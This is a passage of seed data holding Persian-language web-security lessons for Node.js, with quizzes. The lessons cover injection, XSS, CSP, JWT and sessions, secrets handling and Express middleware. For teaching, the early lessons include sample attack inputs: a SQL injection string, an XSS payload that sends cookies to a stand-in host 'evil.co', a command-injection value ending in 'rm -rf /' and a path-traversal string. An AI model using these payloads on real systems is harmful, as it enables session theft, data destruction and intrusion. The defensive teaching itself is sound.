به‌طور پیش‌فرض خروجی را Escape می‌کنند — تا وقتی که خودت درهای فرار را باز نکنی: dangerouslySetInnerHTML در React یا v-html در Vue هرگز نباید با محتوای کاربر پر شوند. و لایه دفاع دوم، Content-Security-Policy است: هدری که به مرورگر می‌گوید «اسکریپت فقط از همین دامنه‌ها، inline ممنوع» — پس حتی اگر تزریق موفق شد، مرورگر اجرای payload را رد می‌کند. دفاع عمیق یعنی همین: چند لایه مستقل که شکست یکی، فاجعه نسازد."},{"k":"code","lang":"js","title":"deepdive-injection.js","code":"// ❌ تزریق — کاربر وارد می‌کند: '' OR ''1''=''1'' --\n`SELECT * FROM users WHERE name = ''${input}''`\n// ← همه کاربران لو رفت؛ با UNION حتی جدول رمزها!\n\n// ✓ پارامتری — input فقط «داده» است\ndb.query(''SELECT * FROM users WHERE name = $1'', [input]);\n\n// ❌ XSS در React — محتوای کاربر اجرا می‌شود!\n<div dangerouslySetInnerHTML={{ __html: comment.body }} />\n// کامنت: <img src=x onerror=\"fetch(''evil.co?c=''+document.cookie)\">\n\n// ✓ پیش‌فرض امن — React خودش Escape می‌کند\n<div>{comment.body}</div>\n\n// لایه دوم: CSP در پاسخ سرور\n// Content-Security-Policy:\n//   default-src ''self''; script-src ''self''; object-src ''none''\n// → حتی اسکریپت تزریق‌شده هم اجرا نمی‌شود"},{"k":"p","t":"دو پسرعموی کمتر شناخته‌شده تزریق که باید بشناسی: تزریق فرمان سیستمی (وقتی ورودی کاربر به shell_exec یا child_process می‌رسد — exec(''ping '' + host) با host برابر 8.8.8.8; rm -rf / یعنی فاجعه کامل سرور؛ همیشه از فرم آرایه‌ای execFile استفاده کن که shell را دور می‌زند) و تزریق مسیر (../../../etc/passwd برای خواندن فایل‌های بیرون پوشه مجاز — مسیر را canonicalize کن و بعد چک کن زیر ریشه مجاز است). الگوی همه‌شان یکی است: ورودیِ کنترل‌نشده به مفسری می‌رسد که آن را اجرا می‌کند — درمان همیشه ساختار است، نه فیلتر."},{"k":"table","head":["حمله","ورودی کثیف کجا می‌رود","درمان قطعی"],"rows":[["SQLi","رشته Query دیتابیس","Query پارامتری‌شده — همیشه"],["XSS","HTML خروجی مرورگر","Escape خودکار فریم‌ورک + CSP"],["Command Injection","فرمان پوسته سیستم","execFile با آرایه آرگومان"],["Path Traversal","مسیر فایل","canonicalize + allowlist ریشه"],["SSRF","URL فراخوانی سرور","allowlist دامنه + ممنوعیت IPهای داخلی"]]},{"k":"tip","title":"نکته منتور","t":"یک بعدازظهر با DVWA یا PortSwigger Web Academy (رایگان) بازی کن و SQLi و XSS را عملاً اجرا کن — کسی که حمله را با دستش انجام داده، دفاع را هیچ‌وقت فراموش نمی‌کند. و OWASP Top 10 را هر دو سال یک‌بار روزنامه‌وار بخوان؛ فهرست مشترک همه مکالمات امنیت وب است."}]'::jsonb, '[{"q":"چرا query پارامتری‌شده در برابر تزریق مقاوم است؟","opts":["کلمات خطرناک را حذف می‌کند","ساختار SQL قبل از رسیدن داده نهایی شده؛ داده هرگز کد نمی‌شود","رمزنگاری می‌کند","ورودی را کوتاه می‌کند"],"ans":1,"why":"دیتابیس اول ساختار query را می‌سازد و بعد مقادیر را فقط به‌عنوان داده جایگذاری می‌کند؛ کاراکترهای خاص معنای دستوری پیدا نمی‌کنند."},{"q":"در React چرا {userComment} امن است ولی dangerouslySetInnerHTML نه؟","opts":["سرعت فرق دارد","React در اولی به‌طور خودکار خروجی را escape می‌کند","دومی کندتر است","فرقی ندارند"],"ans":1,"why":"React کاراکترهای معنادار HTML را به متن بی‌خطر تبدیل می‌کند؛ dangerouslySetInnerHTML عمداً این سپر را خاموش می‌کند."}]'::jsonb),
('c16-l2', 'node', 'احراز هویت؛ Session و JWT', 60, 6, '[{"k":"p","t":"HTTP بی‌حالت است؛ سرور دو کاربر متوالی را نمی‌شناسد. راه‌حل: بعد از ورود، یک مدرک به کاربر بده و در هر درخواست ببین. دو مدل اصلی: Session (مدرک در سرور، کوکی فقط شناسه) و JWT (مدرک امضاشده در دست کاربر)."},{"k":"code","lang":"js","title":"jwt.js","code":"const jwt = require(\"jsonwebtoken\");\n\n// هنگام ورود — امضا با secret فقط سمت سرور\nconst token = jwt.sign(\n    { sub: user.id, role: user.role },\n    process.env.JWT_SECRET,\n    { expiresIn: \"15m\" }          // عمر کوتاه!\n);\n\n// Middleware احراز هویت\nfunction auth(req, res, next) {\n    const token = req.headers.authorization?.split(\" \")[1];\n    try {\n        req.user = jwt.verify(token, process.env.JWT_SECRET);\n        next();\n    } catch {\n        res.status(401).json({ error: \"invalid token\" });\n    }\n}"},{"k":"table","head":["معیار","Session","JWT"],"rows":[["محل حالت","سرور (Redis)","کلاینت (توکن امضاشده)"],["ابطال فوری","ساده — حذف session","سخت — توکن تا انقضا معتبر است"],["مقیاس‌پذیری","نیاز به store مشترک","بی‌حالت — مناسب میکروسرویس"],["حجم درخواست","کوچک (فقط id)","بزرگ‌تر (کل payload)"]]},{"k":"warn","title":"رمز عبور هرگز","t":"رمز را ذخیره نکن — هش کن! با bcrypt/argon2 که عمداً کند هستند و salt خودکار دارند. MD5 و SHA256 خالص برای رمز ممنوع‌اند: با جدول رنگین‌کمان در ثانیه شکسته می‌شوند."},{"k":"code","lang":"py","title":"password.py","code":"import bcrypt\n\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())\n# ذخیره hashed — نه password!\n\nok = bcrypt.checkpw(password.encode(), hashed)\n# بررسی: هش دوباره محاسبه و مقایسه می‌شود"},{"k":"tip","title":"نکته منتور","t":"Access Token کوتاه‌عمر (۱۵ دقیقه) + Refresh Token بلندعمر با قابلیت ابطال، الگوی استاندارد صنعت است. و هرگز token را در localStorage نگذار — کوکی HttpOnly امن‌تر است."},{"k":"h","t":"عمیق‌تر: Session در برابر JWT — و جایی که Token باید زندگی کند"},{"k":"p","t":"دو فلسفه احراز هویت: Session می‌گوید «سرور حالت را نگه می‌دارد» — یک شناسه تصادفی غیرقابل‌حدس در کوکی HttpOnly، و جدول Session در سرور؛ JWT می‌گوید «کلاینت حالت را نگه می‌دارد» — توکنی امضاشده که ادعاها (user id، نقش‌ها) را همراه دارد و سرور فقط امضا را چک می‌کند. تفاوت عملی بزرگ: Session هر لحظه قابل‌ابطال است (ردیفش را پاک کن) ولی JWT تا انقضا معتبر است — «خروج از همه دستگاه‌ها» با JWT یعنی لیست سیاه و پیچیدگی. در مقابل، JWT برای معماری چندسرویسه و Stateless طبیعی‌تر است چون سرویس‌ها بدون پرسش از هم می‌توانند اعتبارش را بسنجند. هر دو درست‌اند — انتخاب بستگی به معماری و نیاز ابطال دارد، نه به مد سال."},{"k":"p","t":"اما مهم‌تر از انتخاب نوع توکن، «کجا نگه‌داشتنش» است: LocalStorage دستِ هر اسکریپت صفحه را می‌گیرد — یعنی یک XSS ساده، توکن را می‌دزدد و تا ابد (JWT بدون انقضای کوتاه) قابل‌استفاده می‌ماند. کوکی با HttpOnly را جاوااسکریپت اصلاً نمی‌بیند — ولی آن‌وقت باید در برابر CSRF دفاع کنی (SameSite=Lax امروز تقریباً کافی است). الگوی مدرن حرفه‌ای: Access Token کوتاه‌عمر (۱۵ دقیقه) + Refresh Token در کوکی HttpOnly با چرخش — حتی اگر Access لو برود، پنجره سوءاستفاده ربع ساعت است و استفاده از Refreshِ قدیمی (بعد از چرخش) یعنی هشدار دزدی. پیچیده‌تر است؛ ولی برای هر چیزی که پول یا حریم خصوصی در میان است، استاندارد عمل است."},{"k":"code","lang":"js","title":"deepdive-tokens.js","code":"// صدور: Access کوتاه + Refresh با چرخش\napp.post(''/auth/login'', async (req, res) => {\n  const user = await verifyCredentials(req.body);\n  if (!user) return res.status(401).json({ error: ''invalid'' });\n\n  const access = jwt.sign(\n    { sub: user.id, role: user.role },\n    ACCESS_SECRET,\n    { expiresIn: ''15m'' });                 // پنجره دزدی: فقط ۱۵ دقیقه\n\n  const refresh = randomBytes(32).toString(''hex'');\n  await db.refreshTokens.insert({          // سمت سرور ذخیره می‌شود\n    tokenHash: sha256(refresh), userId: user.id,\n    expiresAt: addDays(30), rotatedTo: null });\n\n  res.cookie(''refresh'', refresh, {\n    httpOnly: true,        // جاوااسکریپت نمی‌بیند ← در برابر XSS\n    secure: true,          // فقط HTTPS\n    sameSite: ''lax'',       // در برابر CSRF\n    maxAge: 30 * 24 * 3600 * 1000,\n  });\n  res.json({ access });\n});\n\n// چرخش: هر بار استفاده از refresh، قبلی باطل می‌شود\n// استفاده دوباره از refresh باطل → حمله! همه نشست‌های کاربر ابطال شود"},{"k":"table","head":["ویژگی","Session + کوکی","JWT (Access + Refresh)"],"rows":[["ابطال فوری","بدیهی — حذف ردیف","نیاز به لیست سیاه / انقضای کوتاه"],["معماری Stateless","ضعیف — سرور حالت دارد","قوی — مناسب میکروسرویس"],["دزدی با XSS","کوکی HttpOnly مقاوم است","اگر در LocalStorage باشد، فاجعه"],["دزدی با CSRF","باید دفاع شود (SameSite)","کمتر در معرض — ولی Refresh کوکی‌باز هم باید"],["حجم هر درخواست","یک شناسه کوچک","توکن بزرگ‌تر در هدر Authorization"]]},{"k":"warn","title":"اشتباهات مرگبار رایج","t":"الگوریتم none را بپذیری (JWT بدون امضا!)؛ کلید مخفی کوتاه یا در کد Commit‌شده؛ توکن در URL که به لاگ‌ها و Referer نشت می‌کند؛ رمز عبور با MD5/SHA1 در برابر hash کند و نمک‌دار مثل Argon2/bcrypt؛ و «رمزنگاری» به‌جای hash برای رمز عبور. هر کدام از این‌ها در یک گزارش امنیتی واقعی، تیتر بوده‌اند."},{"k":"tip","title":"نکته منتور","t":"برای هر پروژه جدید، اول ببین کتابخانه احراز هویت بالغ (Auth.js، Supabase Auth، Keycloak) نیازت را پوشش می‌دهد یا نه — پیاده‌سازی دستی رمزنگاری، حتی برای مهندسان باتجربه، جایی است که اشتباه‌های ظریف جا می‌مانند. «رمزنگاری را خودت ننویس» قدیمی‌ترین و درست‌ترین نصیحت امنیت است."}]'::jsonb, '[{"q":"چرا bcrypt برای رمز عبور بهتر از SHA256 است؟","opts":["خروجی کوتاه‌تری دارد","عمداً کند و saltدار است؛ brute force گران می‌شود","جدیدتر است","برگشت‌پذیر است"],"ans":1,"why":"سرعت برای رمز عیب است: اگر دیتابیس لو برود، مهاجم میلیاردها حدس در ثانیه می‌زند؛ کندی bcrypt این را عملاً غیرممکن می‌کند."},{"q":"بزرگ‌ترین ضعف JWT در برابر Session چیست؟","opts":["حجم","ابطال فوری توکن قبل از انقضا سخت است","امن نیست","فقط برای موبایل کار می‌کند"],"ans":1,"why":"توکن امضاشده تا انقضا معتبر است؛ اگر لو برود یا کاربر اخراج شود، session را می‌شود همان لحظه حذف کرد ولی JWT را نه (مگر با blacklist)."}]'::jsonb),
('c16-l3', 'node', 'HTTPS، Secret و چک‌لیست استقرار', 50, 7, '[{"k":"p","t":"HTTPS ترافیک را رمز می‌کند تا در مسیر شنود و دستکاری نشود؛ با Let''s Encrypt رایگان و خودکار است — امروز بهانه‌ای برای HTTP نیست. اما بزرگ‌ترین نشت‌ها از کد می‌آید: secretهایی که داخل Git push شده‌اند و تا ابد در تاریخچه‌اند."},{"k":"code","lang":"bash","title":"secrets","code":"# هرگز در کد:\nAPI_KEY = \"sk-live-8f3a...\"    # ❌ داخل git می‌ماند!\n\n# همیشه متغیر محیطی:\nimport os\nAPI_KEY = os.environ[\"API_KEY\"]   # ✅\n\n# و در .gitignore:\necho \".env\" >> .gitignore\n\n# اگر اشتباهاً push شد، فقط حذف کافی نیست!\ngit filter-repo --path .env --invert-paths\n# و مهم‌تر: همان لحظه secret را Rotate کن"},{"k":"list","items":["HSTS: هدری که مرورگر را مجبور به HTTPS می‌کند","به‌روزرسانی وابستگی‌ها: بیشتر نفوذها از CVEهای شناخته‌شده‌اند","Least Privilege: هر سرویس فقط دسترسی‌هایی که لازم دارد","لاگ حساس ممنوع: رمز و token هرگز نباید در لاگ بیاید","2FA برای ادمین‌ها و دسترسی‌های حساس"]},{"k":"def","term":"Attack Surface","t":"مجموع نقاطی که مهاجم می‌تواند وارد شود: هر endpoint باز، هر پورت، هر وابستگی. هرچه سطح حمله کوچک‌تر (پورت‌های کمتر، سرویس‌های کمتر، دسترسی‌های کمتر)، امنیت بیشتر — امنیت یعنی کم‌کردن، نه افزودن ابزار."},{"k":"warn","title":"تاریخچه Git حافظه دارد","t":"push کردن .env یعنی انتشار عمومی؛ حتی با حذف در commit بعدی، در تاریخچه و کش‌های GitHub می‌ماند و ربات‌ها در چند ثانیه پیدایش می‌کنند. تنها راه: حذف از تاریخچه + چرخش فوری secret."},{"k":"h","t":"عمیق‌تر: زنجیره گواهی و چک‌لیست استقرار"},{"k":"p","t":"HTTPS فقط رمزنگاری نیست — سه ضمانت همزمان است: محرمانگی (شنودکننده فقط نویز می‌بیند)، صحت (دست‌کاری وسط راه لو می‌رود) و هویت (واقعاً با example.com حرف می‌زنی، نه یک همسایه متقلب). ضمانت سوم از زنجیره اعتماد می‌آید: مرورگر به چند ده CA ریشه اعتماد دارد؛ گواهی سایت تو را یک CA امضا کرده و آن CA را ریشه امضا کرده — پس اعتماد «ارث» می‌رسد. حمله MITM دقیقاً می‌خواهد این زنجیره را بشکند و Let''s Encrypt با صدور رایگان و خودکار گواهی، بهانه «گرانی» را برای همیشه از بین برده — امروز سایتی که HTTP باشد، از نظر مرورگرها «ناامن» برچسب می‌خورد و عملاً مرده است."},{"k":"p","t":"رازها (Secret) را هم مثل کد مدیریت کن — یعنی اصلاً در کد نگذار. متغیرهای محیطی برای توسعه، Vault یا Secret Manager برای تولید، و تزریق امن در CI (مثل GitHub Secrets) که هرگز در لاگ چاپ نمی‌شوند. نشانه‌های بلوغ تیم: هیچ کلیدی در ریپازیتوری نیست (حتی History — گیت فراموش نمی‌کند؛ اگر روزی Commit شد، باید Rotate شود نه فقط حذف)، کلیدها تاریخ انقضا و چرخش خودکار دارند، و دسترسی به رازها لاگ می‌شود. و اگر روزی کلید API لورفت، ترتیب درست این است: اول کلید جدید بساز و سرویس‌ها را رویش ببر، بعد قدیمی را باطل کن — نه برعکس که وسط کار همه‌چیز قطع شود."},{"k":"code","lang":"txt","title":"چک‌لیست استقرار — قبل از هر ریلیز","code":"انتقال و شبکه:\n  [ ] HTTPS اجباری + ریدایرکت خودکار از HTTP\n  [ ] HSTS فعال — مرورگر حتی HTTP را هم امتحان نکند\n  [ ] گواهی با تمدید خودکار (certbot --deploy-hook)\n\nرازها:\n  [ ] هیچ کلیدی در کد/ریپازیتوری/History نیست\n  [ ] رازها از Vault یا Secret Manager می‌آیند\n  [ ] کلید DB و API برای هر محیط جداست (dev ≠ prod)\n\nسربرگهای امنیتی:\n  [ ] Content-Security-Policy (حداقل default-src ''self'')\n  [ ] X-Content-Type-Options: nosniff\n  [ ] Referrer-Policy: strict-origin-when-cross-origin\n  [ ] کوکی‌ها: HttpOnly + Secure + SameSite\n\nوابستگی‌ها و دسترسی:\n  [ ] npm audit / pip-audit در Pipeline — هشدار جدید صفر\n  [ ] کانتینر بدون root اجرا می‌شود\n  [ ] لاگ‌ها رمز عبور/توکن چاپ نمی‌کنند (یک grep بزن!)"},{"k":"p","t":"نگرش درست نسبت به امنیت، «اگر» نیست، «وقتی» است: فرض کن بالاخره یک روز باگی خواهد بود — سوال این است که چقدر طول می‌کشد بفهمی و چقدر آسیب می‌بینی. برای فهمیدن: لاگ‌های احراز هویت (ورودهای شکست‌خورده پیاپی)، مانیتورینگ الگوهای غیرعادی و برنامه Bug Bounty یا حداقل یک ایمیل security@. برای کم‌کردن آسیب: اصل حداقل امتیاز (هر سرویس فقط دسترسی‌هایی که لازم دارد)، جداسازی محیط‌ها (دیتابیس توسعه هرگز داده واقعی ندارد) و قابلیت Rollback فوری. امنیت یک فیچر نیست که آخر پروژه اضافه شود — یک عادت روزانه است که در هر PR، هر Query و هر دیپلوی تکرار می‌شود."},{"k":"tip","title":"نکته منتور","t":"این چک‌لیست را به‌صورت یک فایل SECURITY-CHECKLIST.md در ریپازیتوری‌ات نگه دار و قبل از هر ریلیز بزرگ رویش برو — ده دقیقه وقت، و خیالی که می‌خرد با هیچ ابزار مانیتورینگی قابل‌خرید نیست. و گزارش امنیتی هر کتابخانه‌ای که استفاده می‌کنی را Subscribe کن؛ دانستن CVE روز قبل از مهاجمان، نیمی از دفاع است."}]'::jsonb, '[{"q":"اگر secret اشتباهاً push شد، اولین کار چیست؟","opts":["حذف commit","چرخش (Rotate) فوری همان secret","پاک‌کردن branch","اطلاع به تیم"],"ans":1,"why":"فرض کن لو رفته — ربات‌ها در ثانیه می‌خوانندش. حذف از تاریخچه لازم است ولی تا secret عوض نشود، آسیب ادامه دارد."},{"q":"HTTPS جلوی چه چیزی را می‌گیرد؟","opts":["همه هک‌ها","شنود و دستکاری ترافیک در مسیر","SQL Injection","فیشینگ"],"ans":1,"why":"TLS کانال را رمز و یکپارچه می‌کند؛ ولی اگر خود برنامه تزریق داشته باشد یا کاربر رمز را در سایت جعلی بزند، HTTPS کمکی نمی‌کند — یک لایه از چند لایه است."}]'::jsonb),
('node-x1', 'node', 'Middleware در Express — زنجیره مسئولیت', 45, 8, '[{"k":"p","t":"هر درخواست HTTP در Express از یک خط لوله رد می‌شود: لاگر، احراز هویت، اعتبارسنجی، کنترل‌کننده نهایی. Middleware یعنی توابعی که هر کدام یک مسئولیت دارند و درخواست را به بعدی می‌سپارند — الگوی Chain of Responsibility که در دوره الگوهای طراحی دیدی، به شکل اجرا درآمده."},{"k":"code","lang":"js","title":"server.js","code":"const express = require(''express'');\nconst app = express();\n\n// ۱) زمان‌سنج — قبل از همه\napp.use((req, res, next) => {\n  const t0 = Date.now();\n  res.on(''finish'', () =>\n    console.log(`${req.method} ${req.url} — ${Date.now() - t0}ms`));\n  next();                        // بدون next() درخواست همین‌جا می‌ماند!\n});\n\n// ۲) احراز هویت — فقط مسیرهای /api\napp.use(''/api'', (req, res, next) => {\n  if (req.headers[''x-token''] !== ''SECRET'')\n    return res.status(401).json({ error: ''Unauthorized'' });\n  next();\n});\n\n// ۳) کنترل‌کننده نهایی\napp.get(''/api/users'', (req, res) => {\n  res.json([{ id: 1, name: ''Sara'' }]);\n});\n\n// ۴) مدیریت خطای مرکزی — همیشه ۴ آرگومان\napp.use((err, req, res, next) => {\n  console.error(err.stack);\n  res.status(500).json({ error: ''خطای داخلی'' });\n});\n\napp.listen(3000);"},{"k":"list","items":["ترتیب مهم است: Middlewareها به ترتیب ثبت اجرا می‌شوند — لاگر اول، auth بعد","next() فرمان عبور است؛ فراموشش یعنی درخواست برای همیشه آویزان","مسیردار ثبت کن: app.use(''/admin'', ...) فقط آن مسیر را بگیرد","آخر از همه: Middleware خطا با چهار پارامتر (err, req, res, next)"]},{"k":"def","term":"مدیریت خطای مرکزی","t":"به‌جای try/catch در هر کنترل‌کننده، خطا را با next(err) به انتهای زنجیره بفرست تا یک جا لاگ، پاک‌سازی و پاسخ مناسب بدهد. در Express 5 (و با wrapper در نسخه ۴)، خطاهای async هم خودکار به همین چاه می‌افتند."},{"k":"code","lang":"js","title":"کنترل‌کننده امن با wrapper","code":"// بدون wrapper، هر throw در تابع async\n// سرور را می‌گیرد نه middleware خطا را:\nconst asyncHandler = (fn) => (req, res, next) =>\n  Promise.resolve(fn(req, res, next)).catch(next);\n\napp.get(''/api/orders'', asyncHandler(async (req, res) => {\n  const orders = await db.orders.find({ user: req.user });\n  // حتی اگر اینجا خطا بدهد، به middleware خطا می‌رسد\n  res.json(orders);\n}));"},{"k":"tip","title":"نکته منتور","t":"Middleware اختصاصی خودت را در پوشه جدا (middleware/auth.js و…) نگه دار و تک‌وظیفه‌ای بنویس — هر فایل یک مسئولیت. روزی که بخواهی لاگ‌ها را به سیستم متمرکز بفرستی، فقط یک فایل عوض می‌شود."}]'::jsonb, '[{"q":"اگر Middlewareای next() را صدا نزند چه می‌شود؟","opts":["خطای ۵۰۰ می‌دهد","درخواست همان‌جا می‌ماند تا Client timeout شود — هیچ پاسخی نمی‌رسد","خودکار به بعدی می‌رود","سرور کرش می‌کند"],"ans":1,"why":"زنجیره فقط با next() جلو می‌رود؛ بدون آن نه پاسخ می‌رود نه Middleware بعدی اجرا می‌شود — مرورگر فقط منتظر می‌ماند تا خسته شود!"},{"q":"چرا Middleware مدیریت خطا دقیقاً ۴ پارامتر دارد؟","opts":["قرارداد سلیقه‌ای است","Express از روی تعداد پارامترها تشخیص می‌دهد این یک error handler است نه middleware معمولی","برای سازگاری با جاوا","پارامتر چهارم استفاده نمی‌شود"],"ans":1,"why":"این تشخیص با Reflection است: تابع چهارپارامتره فقط وقتی صدا می‌شود که next(err) شده باشد؛ وگرنه از رویش رد می‌شود."}]'::jsonb),
('node-x2', 'node', 'احراز هویت در Node — از Session تا JWT عملی', 55, 9, '[{"k":"p","t":"هر API بالاخره به این سوال می‌رسد: «این درخواست از طرف کیست و اجازه‌اش چیست؟» در این درس یک سیستم ورود واقعی می‌سازیم با همه اجزایش: هش رمز با bcrypt (هرگز ذخیره متن‌ساده!)، Session یا JWT، Middleware محافظ مسیر، و نقش‌ها. مهم‌تر از کد، تصمیم‌هاست: Session برای اپ‌های تک‌سرور با نیاز به ابطال فوری؛ JWT برای معماری سرویسی و Stateless — و در هر دو، کوکی HttpOnly خانه امن توکن است، نه LocalStorage."},{"k":"code","lang":"js","title":"auth.js","code":"const bcrypt = require(''bcrypt'');\nconst jwt = require(''jsonwebtoken'');\n\n// ثبت‌نام — هش کند و نمک‌دار؛ reverse مهندسی‌ناپذیر\nrouter.post(''/register'', async (req, res) => {\n  const { email, password } = req.body;\n  if (!isEmail(email) || password.length < 8)\n    return res.status(422).json({ error: ''ورودی نامعتبر'' });\n\n  const hash = await bcrypt.hash(password, 12);  // cost 12 ≈ ۲۵۰ms عمدی!\n  await db.users.insert({ email, hash });        // hash ذخیره می‌شود نه رمز\n  res.status(201).end();\n});\n\n// ورود — مقایسه امن و صدور توکن\nrouter.post(''/login'', async (req, res) => {\n  const user = await db.users.byEmail(req.body.email);\n  const ok = user && await bcrypt.compare(req.body.password, user.hash);\n  if (!ok) return res.status(401).json({ error: ''invalid'' });\n  // ↑ همان پیام برای «کاربر نیست» و «رمز اشتباه» — اطلاعات نده!\n\n  const token = jwt.sign({ sub: user.id, role: user.role },\n                         process.env.JWT_SECRET, { expiresIn: ''15m'' });\n  res.json({ access: token });\n});\n\n// Middleware محافظ — همه مسیرهای /api/me پشت این درند\nfunction auth(req, res, next) {\n  const token = req.headers.authorization?.replace(''Bearer '', '''');\n  try {\n    req.user = jwt.verify(token, process.env.JWT_SECRET);\n    next();\n  } catch {\n    res.status(401).json({ error: ''unauthorized'' });\n  }\n}\n\nconst adminOnly = (req, res, next) =>\n  req.user.role === ''admin'' ? next() : res.status(403).end();\n\nrouter.get(''/api/me'', auth, (req, res) => res.json({ id: req.user.sub }));\nrouter.delete(''/api/users/:id'', auth, adminOnly, removeUser);"},{"k":"list","items":["bcrypt/scrypt/argon2 — هش کند و نمک‌دار؛ MD5 و SHA سریع‌اند و برای رمز عبور یعنی دعوت از حمله","Secret از متغیر محیطی — نه کد، نه ریپازیتوری، نه لاگ؛ و برای هر محیط جدا","پیام‌های خطای یکسان برای کاربرِ ناموجود و رمز اشتباه — جلوگیری از شمارش کاربران معتبر","نرخ‌محدودکننده روی /login (مثل ۵ تلاش در ۱۵ دقیقه) — کندترین حمله Brute-force با این یک خط می‌میرد","Refresh Token با چرخش و HttpOnly — Access کوتاه‌عمر (۱۵ دقیقه) پنجره دزدی را کوچک می‌کند"]},{"k":"code","lang":"js","title":"rate-limit.js","code":"// محافظ ورود در برابر brute force — پنج خط که شب را نجات می‌دهد:\nconst attempts = new Map();   // در تولید: Redis\n\nfunction loginLimiter(req, res, next) {\n  const key = req.ip + '':'' + req.body.email;\n  const now = Date.now();\n  const tries = (attempts.get(key) ?? []).filter(t => now - t < 15 * 60_000);\n  if (tries.length >= 5) return res.status(429)\n    .json({ error: ''زیاد تلاش کردی؛ ۱۵ دقیقه صبر کن'' });\n  tries.push(now);\n  attempts.set(key, tries);\n  next();\n}\n\napp.post(''/login'', loginLimiter, loginHandler);"},{"k":"warn","title":"سه اشتباه که لاگ‌ها را پر می‌کند","t":"۱) توکن JWT بدون exp — توکنی که منقضی نمی‌شود، کلید مادام‌العمر است. ۲) verify را با try/catch نگرفتن — اولین توکن منقضی، سرور را ۵۰۰ می‌کند. ۳) چاپ req.body در لاگ «برای دیباگ» — یعنی رمز عبور همه کاربران، متن ساده، در لاگ مرکزی. لاگر را طوری تنظیم کن فیلدهای حساس را ماسک کند؛ یک grep روی لاگ‌هایت بزن و ببین چه می‌یابی."},{"k":"tip","title":"نکته منتور","t":"قبل از اختراع دوباره چرخ، passport.js و Auth.js را ببین — ولی یک‌بار این نسخه دستی را بنویس؛ چون روزی که نشستِ کاربر «به‌شکل عجیبی» خراب شد، فقط کسی که لایه‌ها را می‌فهمد می‌تواند بفهمد کجای زنجیره (هش؟ توکن؟ کوکی؟ زمان سرور؟) شکسته است."}]'::jsonb, '[{"q":"چرا bcrypt به‌عمد «کند» است؟","opts":["مشکل پیاده‌سازی است","تا brute force و Rainbow Table گران شود — هر حدس ۲۵۰ میلی‌ثانیه یعنی میلیون‌ها سال برای یک دیتابیس لو رفته","برای امنیت شبکه","برای کش بهتر"],"ans":1,"why":"کاربر واقعی یک‌بار لاگین می‌کند و ۲۵۰ms را حس نمی‌کند؛ ولی مهاجم باید میلیاردها حدس بزند — هرکدام ۲۵۰ms. کندبودن اینجا ویژگی است."},{"q":"Access Token کوتاه‌عمر + Refresh چرخان چه چیزی را محدود می‌کند؟","opts":["تعداد کاربران","پنجره زمانی سوءاستفاده از توکن لو رفته و امکان کشف استفاده غیرمجاز","سرعت سرور","حجم دیتابیس"],"ans":1,"why":"اگر Access بدزدیده شود، ۱۵ دقیقه بعد مرده است؛ و اگر دزد بخواهد با Refresh قدیمی (بعد از چرخش) وارد شود، سیستم دزدی را می‌فهمد و همه نشست‌ها را می‌سوزاند."}]'::jsonb),
('node-b1', 'node', 'Event Loop در عمل', 63, 10, '[{"k":"p","t":"Event Loop به Node اجازه می‌دهد با یک thread همزمان هزاران اتصال را مدیریت کند؛ عملیات‌های I/O را به سیستم‌عامل می‌سپارد و با callback برمی‌گردد."},{"k":"h","t":"یک نخ، هزاران اتصال؛ معجزه I/O برون‌سپاری‌شده"},{"k":"p","t":"Node تک‌نخ است — ولی این ضعف نیست، انتخاب است. عملیات‌های ورودی/خروجی (خواندن فایل، درخواست شبکه، تایمر) را به سیستم‌عامل یا libuv می‌سپارد و وقتی جواب آماده شد، callbackش در صف می‌نشیند. نخ اصلی فقط «کد جاوااسکریپت» را اجرا می‌کند و بین عمل‌ها آزاد است — پس هزاران اتصال همزمان، هزاران نخ نمی‌خواهند، فقط هزاران callback در صف. این یعنی مصرف حافظه ناچیز برای هر اتصال و حذف کامل race conditionهای نخ‌ها در کد کاربر. ولی یک قرارداد آهنین: کدت نباید هیچ‌وقت «مسدود» باشد — یک while طولانی یا JSON.parse روی چند مگابایت، کل سرور را برای همه کاربرها قفل می‌کند."},{"k":"h","t":"دو صف؛ جایی که Promiseها جلوترند"},{"k":"p","t":"Event Loop فقط یک صف نیست: ماکروتسک‌ها (setTimeout، setInterval، I/O) و میکروتسک‌ها (Promise.then، queueMicrotask) دو صف جدا دارند و قانونش سفت است — بعد از هر ماکروتسک، کل صف میکروتسک‌ها تا ته خالی می‌شود، حتی اگر وسطش میکروتسک جدیدی ساخته شود. حالا خروجی کلاسیک را می‌فهمی: log(''۱'') اجرا، setTimeout(۲) به صف ماکرو می‌رود، Promise(۳) به صف میکرو، log(''۴'')؛ پایان اسکریپت → اول کل میکروها (۳) بعد ماکروها (۲). خطر واقعی هم همین‌جاست: میکروتسکی که خودش میکروتسک می‌سازد (Promise در حلقه)، هرگز به ماکروتسک‌ها نمی‌رسد — و رندر/تایمرها برای همیشه گرسنه می‌مانند."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"js","title":"پیش‌بینی خروجی — قبل از اجرا فکر کن","code":"console.log(''الف'');\n\nsetTimeout(() => console.log(''ب''), 0);\n\nPromise.resolve()\n  .then(() => {\n    console.log(''ج'');\n    return Promise.resolve(''د'');\n  })\n  .then(v => console.log(v));\n\nqueueMicrotask(() => console.log(''ه''));\n\nconsole.log(''و'');\n\n// خروجی: الف، و، ج، د، ه، ب\n// اسکریپت → کل میکروها (ج، د، ه) → ماکروها (ب)"},{"k":"def","term":"Starvation (گرسنگی صف)","t":"وقتی یک صف (معمولاً میکروتسک‌ها) بی‌وقفه کار جدید تولید می‌کند و صف دیگر (ماکروتسک‌ها: تایمرها، رویدادها) هرگز نوبت نمی‌گیرد. در Node یعنی سرور «زنده» است ولی به هیچ درخواستی جواب نمی‌دهد — و معمولاً یک حلقه Promise مقصر است."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["Node تک‌thread است ولی I/O خارج از آن انجام می‌شود","میکروتسک‌ها (Promise) قبل از ماکروتسک‌ها (setTimeout) اجرا می‌شوند","کد مسدودکننده حلقه را قفل و همه را معطل می‌کند"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"js","title":"loop.js","code":"console.log(''۱'');\nsetTimeout(() => console.log(''۲''), 0);\nPromise.resolve().then(() => console.log(''۳''));\nconsole.log(''۴'');\n// خروجی: ۱ ، ۴ ، ۳ ، ۲"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: Node تک‌thread است ولی I/O خارج از آن انجام می‌شود بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم 